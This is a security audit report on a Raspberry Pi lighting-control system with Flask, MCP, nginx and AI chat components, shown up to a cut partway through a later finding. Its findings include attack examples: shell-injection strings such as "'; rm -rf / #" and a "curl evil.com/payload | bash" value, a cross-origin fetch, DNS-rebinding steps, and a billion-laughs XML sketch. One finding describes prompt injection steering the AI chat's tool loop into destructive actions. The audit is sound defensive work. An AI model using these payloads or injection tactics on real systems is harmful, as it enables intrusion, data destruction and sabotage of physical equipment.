# Security Audit — lights-pi Production System

**Date:** June 9, 2026  
**Scope:** Full-stack review — Flask control server, MCP server, nginx, systemd services, Tailscale, shell tooling, AI integrations  
**Environment:** Raspberry Pi (headless), LAN + Tailscale mesh VPN, production deployment

---

## Executive Summary

The system has a solid foundation — UFW firewall, SSH key auth, unattended upgrades, gitignored secrets, pinned dependencies — but **every HTTP service runs without authentication**. Combined with wildcard CORS and Tailscale remote access, any device on the network or tailnet has full, unrestricted control of the lighting rig and can trigger shell commands through the AI pipeline.

The most impactful improvements are: adding an auth layer, restricting CORS, and hardening the shell execution path.

---

## Architecture Overview

| Port | Service | Transport | Auth | Binding |
|------|---------|-----------|------|---------|
| 22   | SSH | TCP | Key-based | 0.0.0.0 |
| 80   | nginx (landing page) | HTTP | None | 0.0.0.0 |
| 443  | nginx (TLS reverse proxy) | HTTPS | None | 0.0.0.0 |
| 5000 | Flask control server | HTTP | None | 0.0.0.0 |
| 5001 | MCP server (Streamable HTTP) | HTTP | Token (NOT enforced) | 0.0.0.0 |
| 9999 | QLC+ web UI | HTTP/WS | None | 0.0.0.0 |

All services are accessible via Tailscale MagicDNS (`lights.<tailnet>.ts.net`) in addition to local mDNS (`lights.local`).

---

## Critical Findings

### C1. Zero Authentication on All HTTP Services

**Severity:** Critical  
**Location:** `control-server/app.py` (all routes), `mcp-server/server.py`

Every endpoint on ports 5000, 5001, and 9999 is completely open. Any device on the LAN or Tailscale tailnet can:
- Control all DMX fixtures
- Generate AI scenes (consuming API credits)
- Create, rename, and delete scenes/groups
- Trigger shell commands through scene generation
- Access the agentic chat interface (tool-calling loop)

The MCP server defines `MCP_BEARER_TOKEN` in environment but explicitly does not enforce it:
```python
# server.py entrypoint
if MCP_BEARER_TOKEN:
    print(f"[mcp] bearer token configured (length={len(MCP_BEARER_TOKEN)}) — auth enforcement not yet wired")
```

**Recommendation:**
- Add a `@app.before_request` bearer token check on the control server for API routes
- Wire up the existing MCP bearer token middleware
- For the web UI, implement a simple PIN/session gate (localStorage-based is fine for this threat model)
- Consider mutual TLS or Tailscale ACLs as defense-in-depth

---

### C2. Shell Command Injection via `execute_command()`

**Severity:** Critical  
**Location:** `control-server/app.py`, line ~1437

```python
def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
```

User-controlled data flows into shell commands through the AI interpretation pipeline:
```python
safe_desc = description.replace("'", "'\\''")
cmd = f"{LIGHTSCTL} generate-scene '{safe_desc}' --add-to-workspace"
execute_command(cmd)
```

The single-quote escaping (`replace("'", "'\\''")`) is the standard bash idiom but:
- It doesn't handle backslashes, null bytes, or control characters
- If the AI returns a crafted `description` field (via prompt injection), it could escape quoting
- The `/api/command` endpoint accepts arbitrary text with no length limit
- The `/api/action` endpoint accepts `description` directly without AI mediation

**Attack path:** `POST /api/action` with `{"action": "generate_scene", "parameters": {"description": "'; rm -rf / #"}}` — the manual quoting may or may not catch this depending on shell expansion order.

**Recommendation:**
- Replace `shell=True` with argument lists: `subprocess.run([LIGHTSCTL, "generate-scene", description, ...])` 
- Or use `shlex.quote()` for all user-supplied values
- Add input length limits (e.g., 500 chars for descriptions)
- Validate that AI responses contain only expected action types before execution

---

### C3. Wildcard CORS Allows Cross-Origin Attacks

**Severity:** Critical  
**Location:** `control-server/app.py`, lines 36–37

```python
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")
```

Any website on the internet can make requests to the control server from a user's browser if that user is on the same LAN. An attacker could embed:
```javascript
fetch("http://lights.local:5000/api/blackout", {method: "POST"})
```
in any webpage, and if a studio visitor opens it, the lights go dark.

**Recommendation:**
- Restrict CORS to specific origins: `CORS(app, origins=["http://lights.local", "https://lights.local"])`
- Or remove CORS entirely since the web UI is served from the same origin
- Add the Tailscale hostname to allowed origins if remote access is needed

---

## High Priority Findings

### H1. Werkzeug Development Server in Production

**Severity:** High  
**Location:** `control-server/app.py`, line ~5687

```python
socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)
```

Werkzeug's dev server has no request queuing, no worker isolation, and no protection against slow-loris or connection-exhaustion attacks. A single slow client can block the entire server.

**Recommendation:**
- Migrate to gunicorn with eventlet worker: `gunicorn -k eventlet -w 1 -b 0.0.0.0:5000 app:app`
- This also gives process isolation and proper signal handling

---

### H2. MCP Server Unauthenticated on All Interfaces

**Severity:** High  
**Location:** `mcp-server/server.py`

```python
MCP_HOST = os.getenv("MCP_HOST", "0.0.0.0")
MCP_BEARER_TOKEN = os.getenv("MCP_BEARER_TOKEN", "").strip() or None
# ... auth enforcement not yet wired
```

Via Tailscale, any device on the tailnet has full programmatic control. If `tailscale funnel 5001` is accidentally enabled, it becomes internet-accessible. The MCP server exposes the same tool surface as the agentic chat — generate scenes, manage groups, control all fixtures.

**Recommendation:**
- Wire up bearer token validation as ASGI middleware on the `mcp.streamable_http_app()`
- Bind to `127.0.0.1` if only local/proxied access is needed, or rely on Tailscale ACLs

---

### H3. No Rate Limiting on Any Endpoint

**Severity:** High  
**Location:** All routes in `control-server/app.py`

The `/api/command` and `/api/chat` endpoints make external API calls (OpenAI/Anthropic/Ollama). Without rate limiting:
- A script could exhaust AI API budget in minutes
- Repeated requests could saturate the Pi's limited CPU
- The single QLC+ WebSocket connection could be overwhelmed with rapid state changes

**Recommendation:**
- Add Flask-Limiter or a simple in-memory token bucket
- Suggested limits: 10 AI commands/minute, 60 non-AI requests/minute per IP
- Consider per-session limits once auth is added

---

### H4. Prompt Injection → Tool-Calling Loop

**Severity:** High  
**Location:** `control-server/app.py`, `/api/chat` endpoint (line ~5610)

The agentic chat exposes 30+ tools to an AI model in a loop (`max_iters=10`). User input flows directly into the LLM context with no filtering:

```python
incoming_messages = data.get("messages") or []
# ... passed directly to Anthropic/OpenAI
```

Tools available include `generate_scene` (triggers shell commands), `delete_scene`, `blackout`, `create_group`, and `delete_group`. A crafted message could instruct the AI to:
- Delete all scenes
- Blackout the rig
- Generate scenes with injection payloads in descriptions
- Exhaust the tool-calling loop with expensive operations

**Recommendation:**
- Add input sanitization/length limits on messages
- Consider a tool allowlist for the chat interface (read-only discovery vs. write operations)
- Log all tool calls made by the agentic chat for audit
- Rate limit the chat endpoint more aggressively (3 requests/minute)

---

### H5. Tailscale Funnel Documentation Without Guardrails

**Severity:** High  
**Location:** `docs/TAILSCALE.md`

The docs show `tailscale funnel 5000` as a quick way to share access. Combined with zero authentication, this exposes the entire unauthenticated API to the internet.

**Recommendation:**
- Add a prominent warning that auth must be enabled before using Funnel
- Consider removing Funnel documentation until auth is implemented
- Document Tailscale ACL configuration as a required step

---

## Medium Priority Findings

### M1. No systemd Service Sandboxing

**Severity:** Medium  
**Location:** `scripts/services/control_server.sh`, `scripts/services/mcp_server.sh`

The systemd service units run as the `riversway` user (good — not root) but have no additional sandboxing. If the Flask app is compromised, the attacker gets full shell access as the service user.

Current unit:
```ini
[Service]
Type=simple
User=riversway
ExecStart=...
Restart=always
```

**Recommendation:** Add hardening directives:
```ini
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=read-only
PrivateTmp=yes
ReadWritePaths=/home/riversway/control-server /home/riversway/.qlcplus
CapabilityBoundingSet=
SystemCallFilter=@system-service
```

---

### M2. No Security Headers in nginx Configuration

**Severity:** Medium  
**Location:** `scripts/lib/tls.sh`, lines 165–230

The nginx SSL config provides TLS 1.2+/strong ciphers but lacks:
- `Strict-Transport-Security` (HSTS)
- `X-Frame-Options` (clickjacking protection)
- `X-Content-Type-Options: nosniff`
- `Content-Security-Policy`
- `Referrer-Policy`
- HTTP→HTTPS redirect (intentional per comments, but worth reconsidering)

**Recommendation:** Add to the HTTPS server block:
```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
# add_header Strict-Transport-Security "max-age=31536000" always;  # once all clients have certs
```

---

### M3. No Input Length Validation

**Severity:** Medium  
**Location:** All POST endpoints in `control-server/app.py`

No endpoint validates input length. The `/api/command` endpoint passes arbitrary-length strings to AI APIs (wasting tokens) and ultimately to shell commands. The `/api/chat` endpoint accepts an unbounded message array.

**Recommendation:**
- Limit command input to 500 characters
- Limit chat message arrays to 50 messages, each under 4000 characters
- Return 413/400 for oversized payloads
- Add Flask's `MAX_CONTENT_LENGTH` config

---

### M4. Unencrypted Backups Without Integrity Verification

**Severity:** Medium  
**Location:** `scripts/lib/backup.sh`

- Backups are plain `tar.gz` — no encryption at rest
- No checksums or signatures on backup files
- Restore extracts directly without verification
- Pre-restore backup saved at `/tmp/qlcplus-pre-restore-backup.tar.gz` (world-readable)

**Recommendation:**
- Add GPG encryption for backup archives: `tar -czf - ... | gpg --symmetric --cipher-algo AES256 -o backup.tar.gz.gpg`
- Generate SHA256 checksums alongside backups
- Verify checksums before restore
- Store pre-restore backup in a user-owned directory, not `/tmp`

---

### M5. No Flask SECRET_KEY Configured

**Severity:** Medium  
**Location:** `control-server/app.py`

Flask's `SECRET_KEY` is never set. While no session/cookie auth is currently used, Flask-SocketIO uses it for signing. The default is an empty/random-per-restart value which means:
- SocketIO sessions are invalidated on every restart
- If session auth is added later, cookies will be signed with a predictable default

**Recommendation:**
- Generate and set `SECRET_KEY` from environment: `app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY', os.urandom(32).hex())`

---

### M6. Eval in .env Loader

**Severity:** Medium  
**Location:** `lightsctl.sh`, line ~37

```bash
eval "export $line"
```

The `.env` file parser uses `eval` to export variables. A malicious `.env` file (e.g., from a tampered backup or supply chain attack) could execute arbitrary commands.

**Recommendation:**
- Replace `eval` with `export "${key}=${value}"` or use `declare -x`
- Or source with `set -a; . .env; set +a` (already done in `deploy.sh`)

---

## Lower Priority Findings

### L1. Debug Payloads in API Responses

**Severity:** Low  
**Location:** `/api/command` and `/api/action` responses

```python
"debug": {
    "interpret_ms": interpret_ms,
    "provider": AI_PROVIDER,
    "model": AI_MODEL,
    "is_local": IS_LOCAL,
}
```

Exposes internal architecture details. While not directly exploitable, it aids reconnaissance.

**Recommendation:** Gate debug payloads behind `DEBUG=1` env var, default off in production.

---

### L2. Potential DOM XSS in Group Name Rendering

**Severity:** Low  
**Location:** `control-server/templates/index.html`, onclick handlers

```javascript
onclick="applyGroupTemplate('${escHtml(g.name)}','${t}')"
```

The `escHtml()` function HTML-encodes for element context but doesn't escape for JavaScript string context. A group name containing `')` could break out of the JS string literal. Exploitable only if an attacker can create a group with a crafted name (requires API access — which currently has no auth).

**Recommendation:** Use `JSON.stringify()` for values in JS context, or use `data-*` attributes with event delegation instead of inline onclick handlers.

---

### L3. Landing Page URL Injection

**Severity:** Low  
**Location:** `landing/index.html`, `scripts/services/landing.sh`

URLs are sed-injected into `<a href="__CONTROL_URL__">` from env vars. A `javascript:` URI in `CONTROL_URL` would be an XSS vector. Only exploitable by someone with write access to the `.env` file.

**Recommendation:** Validate that `CONTROL_URL` and `QLC_URL` start with `http://` or `https://` before injection.

---

### L4. No Tailscale ACL Configuration Provided

**Severity:** Low  
**Location:** `docs/TAILSCALE.md`

Tailscale ACLs are mentioned as a one-liner but no example policy is provided. Since all services lack authentication, Tailscale ACLs are the only access control for remote scenarios.

**Recommendation:** Provide a recommended ACL policy:
```json
{
  "acls": [
    {"action": "accept", "src": ["tag:admin"], "dst": ["tag:lights:*"]},
    {"action": "accept", "src": ["tag:operator"], "dst": ["tag:lights:5000,9999"]}
  ]
}
```

---

### L5. No Log Rotation or Audit Trail

**Severity:** Low  
**Location:** System-wide

- All logging goes to stdout/journal (handled by systemd — adequate for this scale)
- No structured audit log for security-relevant events (who changed what, when)
- No alerting on repeated failures or unusual access patterns

**Recommendation:** For production accountability, log all write API calls with timestamp, source IP, and action. Journal is fine as the transport.

---

### L6. CI/CD Has No Security Scanning

**Severity:** Low  
**Location:** `.github/workflows/test.yml`

The CI pipeline runs linting and tests but no:
- Dependency vulnerability scanning (e.g., `pip-audit`, `safety`)
- Static analysis for security issues (e.g., `bandit`)
- Secret scanning

**Recommendation:** Add to the workflow:
```yaml
- name: Security scan
  run: |
    pip install pip-audit bandit
    pip-audit -r control-server/requirements.txt
    bandit -r control-server/ -ll
```

---

## What's Already Done Well

| Area | Status |
|------|--------|
| UFW firewall with deny-all default | ✅ Solid |
| SSH key auth + option to disable passwords | ✅ Solid |
| Unattended security upgrades | ✅ Solid |
| `.env` gitignored, excluded from deploy rsync | ✅ Solid |
| Dependencies pinned to exact versions | ✅ Solid |
| TLS infrastructure (mkcert + nginx proxy) | ✅ Available (not default) |
| Hardware watchdog enabled | ✅ Good reliability measure |
| QLC+ WebSocket connection pooling (single connection) | ✅ Prevents resource exhaustion |
| Non-root service execution | ✅ Good baseline |
| No file upload endpoints | ✅ Reduces attack surface |
| XML parser safe from XXE (Python 3.8+ default) | ✅ Safe |
| `debug=False` on Flask | ✅ No interactive debugger exposed |

---

## Prioritized Remediation Plan

| Priority | Item | Effort | Impact |
|----------|------|--------|--------|
| 1 | Add bearer token auth to control server | 2 hours | Blocks all unauthenticated access |
| 2 | Wire up MCP bearer token | 1 hour | Secures programmatic access |
| 3 | Restrict CORS origins | 15 min | Blocks cross-origin attacks |
| 4 | Replace `shell=True` with arg lists / `shlex.quote()` | 2 hours | Eliminates injection |
| 5 | Add input length validation | 1 hour | Limits abuse surface |
| 6 | Add rate limiting (Flask-Limiter) | 1 hour | Prevents API/resource exhaustion |
| 7 | Add nginx security headers | 30 min | Defense-in-depth |
| 8 | Harden systemd service units | 30 min | Limits blast radius |
| 9 | Add `pip-audit` + `bandit` to CI | 30 min | Catches future issues |
| 10 | Document Tailscale ACL policy | 30 min | Access control for remote |
| 11 | Migrate to gunicorn + eventlet | 3 hours | Proper production server |
| 12 | Encrypt backups | 1 hour | Data protection at rest |

---

## Threat Model Summary

**Primary threat:** Untrusted device on the LAN or tailnet (guest phone, compromised laptop, curious visitor)  
**Secondary threat:** Cross-origin attack via malicious webpage visited by someone on the LAN  
**Tertiary threat:** Prompt injection through AI endpoints leading to workspace manipulation  

The system is **not** internet-facing by default (Tailscale Funnel is opt-in), so the threat model is primarily about LAN/tailnet neighbors. For a studio environment, the most realistic attack is a visitor's phone making API calls, or a malicious webpage exploiting the wildcard CORS.

---

---

## Third-Pass Findings (Deep Dive)

### T1. WiFi PSKs Stored in Plaintext

**Severity:** High  
**Location:** `scripts/provisioning/setup.sh`, `.env`

WiFi passwords are written as plaintext `psk=` entries into `/etc/wpa_supplicant/wpa_supplicant.conf`:
```bash
cat > "${WPA_CONF}" <<WPA
network={
  ssid="${WIFI2_SSID}"
  psk="${WIFI2_PSK}"
  priority=20
}
WPA
```

The PSK values live in the `.env` file on the workstation. `wpa_supplicant` supports hashed PSKs via `wpa_passphrase` but setup.sh doesn't use it. Anyone with read access to `wpa_supplicant.conf` on the Pi (or `.env` on the workstation) can read WiFi credentials.

**Recommendation:**
- Use `wpa_passphrase "$SSID" "$PSK"` to generate hashed PSK entries
- Or switch to NetworkManager's connection files which can use `802-1x` credential stores

---

### T2. Shell Injection via Provisioning Heredocs

**Severity:** Medium  
**Location:** `scripts/provisioning/setup.sh`, lines 56–90

The entire setup script is sent to the Pi as a heredoc with local variable expansion:
```bash
ssh "${PI_USER}@${PI_HOST}" "sudo bash -s" <<EOF
hostnamectl set-hostname "${PI_HOSTNAME}"
...
psk="${WIFI2_PSK}"
EOF
```

If `WIFI2_PSK`, `WIFI2_SSID`, or `PI_HOSTNAME` contain shell metacharacters (e.g., `"; rm -rf /; #`), they'll be interpreted by the root shell on the Pi. An SSID like `My"Network` would break the heredoc quoting.

**Recommendation:**
- Use `<<'EOF'` (single-quoted heredoc, no expansion) and pass variables via environment or as function arguments
- Or properly escape all variables before interpolation

---

### T3. No defusedxml — Billion-Laughs Attack Surface

**Severity:** Medium  
**Location:** `control-server/app.py`, multiple `ET.fromstring()` calls

User-submitted scene XML (via `/api/scenes/save`) is parsed with `xml.etree.ElementTree.fromstring()`. While Python's ElementTree doesn't process external entities (safe from XXE file reads), it IS vulnerable to exponential entity expansion (billion-laughs):

```xml
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaa...">
  <!ENTITY b "&a;&a;&a;&a;&a;">
  ...
]>
<Function>&z;</Function>
```

This could exhaust memory on the Pi. The code does strip `<!DOCTYPE Function>` declarations in one path, but not in all:
```python
scene_root = ET.fromstring(scene_xml.strip().split("<!DOCTYPE Function>")[-1].strip()
                           if "<!DOCTYPE" in scene_xml else scene_xml.strip())
```

**Recommendation:**
- Add `defusedxml` to requirements and use `defusedxml.ElementTree` instead
- Or add a simple size check: reject scene_xml > 100KB

---

### T4. Error Messages Leak Internal State

**Severity:** Medium  
**Location:** Multiple endpoints in `control-server/app.py`

At least 15 endpoints use `str(e)` directly in error responses:
```python
except Exception as e:
    return jsonify({"success": False, "error": str(e)}), 500
```

Python exceptions can reveal:
- **File paths:** `FileNotFoundError: /home/riversway/.qlcplus/default.qxw`
- **Network details:** `ConnectionRefusedError: [Errno 111] Connection refused` (reveals ports/IPs)
- **AI response content:** `interpret_command` returns `f"Failed to parse AI response: {response}"` which could echo user input or internal system prompts

The `/api/status` endpoint also returns `str(WORKSPACE_PATH)` (full filesystem path) even when healthy.

**Recommendation:**
- Wrap exceptions in generic messages: `"Internal error — check server logs"`
- Log the full exception server-side for debugging
- Remove filesystem paths from status responses (use relative paths or just existence flags)

---

### T5. No Request Body Size Limit

**Severity:** Medium  
**Location:** `control-server/app.py` (Flask config)

Flask's `MAX_CONTENT_LENGTH` is never set. Combined with no rate limiting, an attacker can:
- POST multi-megabyte JSON bodies to `/api/scenes/save` or `/api/chat`
- Trigger expensive XML parsing or AI API calls with oversized inputs
- Exhaust the Pi's limited RAM (typically 1-4GB)

**Recommendation:**
```python
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024  # 1MB max
```

---

### T6. Agentic Chat Can Block for 10 Minutes

**Severity:** Medium  
**Location:** `control-server/app.py`, `_anthropic_chat_loop()` / `_openai_chat_loop()`

The chat loop runs `max_iters=10` iterations, each with a 60-second timeout to the AI API. A single `/api/chat` request can therefore block for up to **10 minutes**. On a single-threaded Werkzeug server, this blocks ALL other requests.

**Recommendation:**
- Reduce `max_iters` to 5 (still generous)
- Add a per-request timeout: abort after 120 seconds total regardless of iteration count
- This reinforces the need for gunicorn with multiple workers

---

### T7. DMX Channel Offset Unbounded

**Severity:** Low  
**Location:** `/api/channel` endpoint, line ~2560

```python
channel_offset = data.get("channel", 0)  # 0-based offset within fixture
dmx_address = base_address + channel_offset + 1
```

No bounds check on `channel_offset`. A negative value or one larger than the fixture's channel count would calculate an incorrect DMX address, potentially addressing channels belonging to other fixtures. Not a security issue per se (DMX is a shared bus) but could cause unexpected behavior.

**Recommendation:**
- Validate `0 <= channel_offset < fixture_channel_count`

---

### T8. MCP httpx Client Error Handling

**Severity:** Low  
**Location:** `mcp-server/server.py`, `_get()` function

```python
def _get(path: str) -> dict[str, Any]:
    r = _http().get(path)
    r.raise_for_status()  # raises on 4xx/5xx
    return r.json()
```

If the control server is down, `_get()` raises an unhandled `httpx.ConnectError`. The MCP framework may or may not surface this cleanly to the LLM client. No retry logic exists.

**Recommendation:**
- Wrap in try/except and return a descriptive error dict (like `_post()` already does for 4xx/5xx)
- Add a single retry with 2-second backoff for transient connection failures

---

### T9. Temp File Cleanup on Crash

**Severity:** Low  
**Location:** `control-server/app.py`, `_temp_scene_file()`

```python
fh = tempfile.NamedTemporaryFile(prefix="qlc-scene-", suffix=".xml", delete=False)
```

If the process crashes between file creation and `scene_file.unlink(missing_ok=True)`, orphaned temp files accumulate in `/tmp/`. On a long-running Pi with limited disk, this could eventually fill the partition.

**Recommendation:**
- Add a periodic cleanup of old `qlc-scene-*.xml` files in `/tmp/`
- Or use `PrivateTmp=yes` in systemd (recommended in M1) which auto-cleans on service restart

---

### T10. `static-ip` Command Has No Input Validation

**Severity:** Low  
**Location:** `lightsctl.sh`, `command_static_ip()`

IP address, gateway, and DNS values from command-line arguments are written directly into `dhcpcd.conf` via heredoc. No validation that the values are actually IP addresses. Malicious values could inject arbitrary dhcpcd configuration lines.

**Recommendation:**
- Validate format with a regex: `^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(/[0-9]+)?$`

---

## Positive Findings (Third Pass)

| Area | Assessment |
|------|------------|
| `_call_self()` uses Flask test client (in-process, no SSRF) | ✅ Safe |
| Diagnostics logs endpoint has service allowlist | ✅ Properly restricted |
| No `os.system()`, `os.popen()`, `eval()`, or `exec()` in production Python | ✅ Clean |
| Scene IDs looked up via XML tree search, not filesystem paths | ✅ No path traversal |
| DMX values clamped 0-255 in `set_channel_values()` | ✅ Properly bounded |
| WebSocket commands use integer-coerced values only | ✅ No injection |
| No hardcoded credentials anywhere in codebase | ✅ Clean |
| QLC+ WebSocket connection is localhost-only | ✅ Not exposed |

---

## Fourth-Pass Findings (Attack Vectors & Supply Chain)

### F1. DNS Rebinding Attack

**Severity:** High  
**Location:** `control-server/app.py` — no `@app.before_request` hook, no `SERVER_NAME` config

Flask performs no Host header validation. The server binds to `0.0.0.0:5000` and accepts requests with any `Host` header. This enables DNS rebinding:

1. Victim on the same LAN visits `evil.example.com`
2. Attacker's DNS initially resolves to their server, serves JS payload
3. DNS TTL expires, attacker re-resolves `evil.example.com` to `192.168.1.X` (the Pi's IP)
4. Browser sends requests to the Pi with `Host: evil.example.com`
5. Flask happily serves the request — attacker can call any API endpoint

Combined with no auth and wildcard CORS, this is a complete remote-via-browser exploitation path.

**Recommendation:** Add a `@app.before_request` host validation:
```python
ALLOWED_HOSTS = {"lights.local", "localhost", "127.0.0.1", os.getenv("PI_HOST", "")}

@app.before_request
def validate_host():
    host = request.host.split(":")[0]
    if host not in ALLOWED_HOSTS:
        abort(403)
```

---

### F2. Workspace File Race Condition (Data Corruption)

**Severity:** High  
**Location:** `control-server/app.py` — 6 write paths to `WORKSPACE_PATH`, zero locking

Six endpoints perform unsynchronized read-modify-write on the XML workspace file:
- `_inject_scene_into_workspace()` (save scene)
- `delete_scene()`
- `rename_scene()`
- `duplicate_scene()`
- `_inject_chase_into_workspace()` (create chase)
- `delete_chase()`

Flask-SocketIO runs in threaded mode. Two concurrent requests (e.g., AI generates a scene while user deletes another) will race on `ET.parse() → modify → tree.write()`. The second writer overwrites changes from the first, or worse, writes a partially-read tree.

**Recommendation:** Add a module-level threading lock:
```python
_workspace_lock = threading.Lock()

# Wrap all read-modify-write operations:
with _workspace_lock:
    tree = ET.parse(WORKSPACE_PATH)
    # ... modify ...
    tree.write(str(WORKSPACE_PATH), ...)
```

---

### F3. Supply Chain: Version Mismatch Between Requirements and Deploy Script

**Severity:** Medium-High  
**Location:** `scripts/services/control_server.sh` vs `control-server/requirements.txt`

The deployment script hardcodes:
```bash
pip install Flask==3.0.0 flask-cors==4.0.0 requests==2.31.0
```

But `requirements.txt` specifies:
```
Flask==3.1.3
flask-cors==6.0.2
requests==2.34.2
```

The Pi runs **different versions** than what's tested in CI. If the deploy script is used for initial setup, the Pi has older packages. If `deploy.sh` (rsync) is used later, it syncs code but not dependencies — stale pip packages persist.

Additionally, no `--hash` digests are used, so pip can't verify package integrity.

**Recommendation:**
- Remove hardcoded versions from `control_server.sh` — use `pip install -r requirements.txt` instead
- Generate a lockfile with hashes: `pip-compile --generate-hashes requirements.in`
- Add a deploy step that runs `pip install -r requirements.txt` on the Pi

---

### F4. MCP Server Dependencies Completely Unpinned

**Severity:** Medium  
**Location:** `mcp-server/requirements.txt`, `scripts/services/mcp_server.sh`

```
mcp[cli]>=1.2.0
httpx>=0.27.0
```

Open-ended ranges pull in latest versions on every install. The `mcp` package has many transitive dependencies (Starlette, uvicorn, Pydantic, anyio, etc.) — all resolved dynamically. A compromised or yanked upstream release auto-installs on next deploy.

**Recommendation:** Pin to exact versions and add hashes. Run `pip freeze` on a known-good install and lock it.

---

### F5. `/api/status` Information Disclosure

**Severity:** Medium  
**Location:** `control-server/app.py`, `/api/status` endpoint

Unauthenticated endpoint exposes:
- `WORKSPACE_PATH` — full filesystem path (e.g., `/home/riversway/.qlcplus/default.qxw`)
- `QLC_WS_URL` — internal WebSocket endpoint with host and port
- `AI_PROVIDER` and `AI_MODEL` — reveals what AI services are configured
- `is_local` — reveals deployment topology
- Systemd unit names and their states
- Latency measurements to internal services

This aids reconnaissance for follow-up attacks.

**Recommendation:** Gate the detailed service breakdown behind auth. The public status endpoint should return only `{"ok": true/false}`.

---

### F6. Server Header Leaks Version Information

**Severity:** Low-Medium  
**Location:** Flask/Werkzeug default response headers

Werkzeug sets `Server: Werkzeug/X.X.X Python/3.X.X` on every response. This reveals exact framework and language versions, helping attackers target known vulnerabilities.

**Recommendation:**
```python
@app.after_request
def strip_server_header(response):
    response.headers.pop("Server", None)
    return response
```

---

### F7. GitHub Actions Not SHA-Pinned

**Severity:** Low  
**Location:** `.github/workflows/test.yml`

Actions pinned to tags (`@v4`, `@v5`) rather than commit SHAs. A compromised or force-pushed tag could inject code into CI.

```yaml
- uses: actions/checkout@v4      # should be @<sha>
- uses: actions/setup-python@v5  # should be @<sha>
```

**Recommendation:** Pin to full SHAs:
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

---

### F8. fixture_definitions.py — rglob Follows Symlinks

**Severity:** Low  
**Location:** `control-server/fixture_definitions.py`

`base.rglob("*.qxf")` follows symlinks without depth limit. If an attacker controls `QLC_FIXTURE_DIR` (env var) or can create symlinks in `/usr/share/qlcplus/fixtures/`, they could:
- Cause infinite traversal loops
- Trick the parser into reading arbitrary files (if renamed with `.qxf` extension)

**Recommendation:** Use `rglob` with `follow_symlinks=False` (Python 3.13+) or add a depth limit.

---

---

## Fifth-Pass Findings (Logic Bugs & Amplification)

### V1. Template Name Shell Injection (Unquoted Parameter)

**Severity:** Critical  
**Location:** `control-server/app.py`, lines 1750, 1754, 1762, 1767, 2465, 2469

The `template` parameter is passed **completely unquoted** into shell commands:
```python
template = params.get("template")
cmd = f"{LIGHTSCTL} generate-from-template {template} --add-to-workspace"
execute_command(cmd)  # shell=True
```

Unlike `safe_desc` and `safe_name` which get single-quote escaping, `template` has zero sanitization. A direct POST to `/api/action` or `/api/groups/<name>/template`:
```json
{"action": "apply_template", "parameters": {"template": "; curl evil.com/payload | bash #"}}
```

This is a **direct command injection** without needing to go through the AI layer.

**Recommendation:**
- Validate template against the known whitelist: `youtube-studio`, `party`, `ambient`, `spotlight`, `work-light`, `warm-white`, `cool-white`
- Reject any value not in the list before constructing the command

---

### V2. `/api/batch` Has No Action Count Limit

**Severity:** Medium-High  
**Location:** `control-server/app.py`, `/api/batch` endpoint

The batch endpoint accepts an unbounded `actions` array and executes each one sequentially. An attacker can submit thousands of actions in a single request:
- 1000 `generate_scene` actions = 1000 external AI API calls
- 1000 `apply_template` with injected shells = 1000 subprocesses
- Any number of `blackout` → `adjust_color` cycles for strobe-like DoS of the physical rig

Combined with no auth and no rate limiting, this is an amplification vector.

**Recommendation:**
- Cap actions array to 20 items max
- Add per-action delay or respect rate limiting within batch

---

### V3. AI Response Leaked to Client in Error Message

**Severity:** Medium  
**Location:** `control-server/app.py`, line 1585

```python
except json.JSONDecodeError:
    return {
        "action": "error",
        "parameters": {},
        "explanation": f"Failed to parse AI response: {response}"
    }
```

When the AI returns malformed JSON, the **entire raw AI response** is returned to the client in the `explanation` field. This could contain:
- The system prompt (if the AI echoes it back)
- Internal architecture details mentioned in the system prompt (available action types, fixture info)
- Other users' commands if context leaks between requests (unlikely but architecture-dependent)

This is returned via `/api/command` to the web UI and visible to any LAN user.

**Recommendation:**
- Log the full response server-side
- Return only: `"AI returned invalid response format. Try again."`

---

### V4. Cue Lists Can Run Indefinitely Without Resource Limits

**Severity:** Medium  
**Location:** `control-server/app.py`, `_run_cue_list_async()`

Cue lists run as asyncio tasks on the background event loop. There's no limit on:
- Number of concurrent cue lists (any number can be started via `/api/cue_lists/<id>/go`)
- Number of cues per list (stored in a JSON file, controlled by the API)
- Total duration (`at_ms` can be set to any value — a cue at `at_ms: 86400000` waits 24 hours)

An attacker could create hundreds of cue lists each with thousands of cues, then start them all simultaneously, exhausting the asyncio event loop and memory.

**Recommendation:**
- Limit concurrent running cue lists (e.g., max 5)
- Limit cues per list (e.g., max 200)
- Add maximum total duration (e.g., 1 hour)

---

### V5. No CSRF Protection on State-Changing Endpoints

**Severity:** Medium  
**Location:** All POST/DELETE/PATCH endpoints

There's no CSRF token validation on any endpoint. Since `CORS(app)` allows all origins, a cross-origin form submit or `fetch()` from any website can:
- Delete scenes: `DELETE /api/scenes/123`
- Create groups: `POST /api/groups`
- Trigger AI commands: `POST /api/command`
- Start cue lists: `POST /api/cue_lists/1/go`
- Blackout the rig: `POST /api/blackout`

This is exploitable even without DNS rebinding — standard CORS-bypassed form submissions (which don't trigger preflight for `application/x-www-form-urlencoded`) could reach the server.

Note: Flask won't parse the form-encoded body as JSON, but simple GET-based endpoints like `/api/diagnostics/reload_fixture_definitions` (if any exist as POST) or carefully crafted requests could still cause damage.

**Recommendation:** The auth layer (item #1) solves this — once a bearer token is required, CSRF is mitigated. As defense-in-depth, validate `Content-Type: application/json` on all POST endpoints and reject form-encoded requests.

---

### V6. Cue List JSON File Has No Locking Either

**Severity:** Low-Medium  
**Location:** `control-server/app.py`, `_save_cue_lists()`

The `CUE_LISTS_FILE` and `GROUPS_FILE` use `file.write_text(json.dumps(...))` with no locking, same as the workspace XML race condition (F2). Concurrent save/delete of cue lists or groups can corrupt these JSON files.

**Recommendation:** Use the same `_workspace_lock` or separate locks for each file.

---

### V7. No Graceful Shutdown — Orphaned Asyncio Tasks

**Severity:** Low  
**Location:** `control-server/app.py` — no signal handlers, no `atexit`

